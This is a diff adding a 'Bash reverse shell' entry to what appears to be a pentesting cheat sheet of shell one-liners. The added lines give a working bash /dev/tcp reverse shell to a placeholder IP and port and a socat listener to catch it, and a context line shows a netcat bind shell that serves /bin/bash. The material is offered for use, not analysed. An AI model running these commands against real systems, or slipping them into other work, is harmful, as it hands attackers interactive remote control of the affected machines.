@@ -113,6 +113,20 @@ nc -e /bin/bash -lp *port*
 cat /proc/cpuinfo
 ```
 
+**Bash reverse shell** (@icleus)
+Works on all distrobutions where egress filtering is not in place / quiet open, use this to reverse connect to your lsitening host.
+
+```bash
+bash -i>& /dev/tcp/123.123.123.123/1234 0>&1 &
+```
+
+I find this best works with a socat listener due to the readline support.
+
+```bash
+socat readline TCP-LISTEN:1234
+```
+
+
 Credits
 -----------
 Credits to @TheAndrewBalls for posting some awsome one liners (the hidden SSH example and the DNS enumeration are both his contributions)
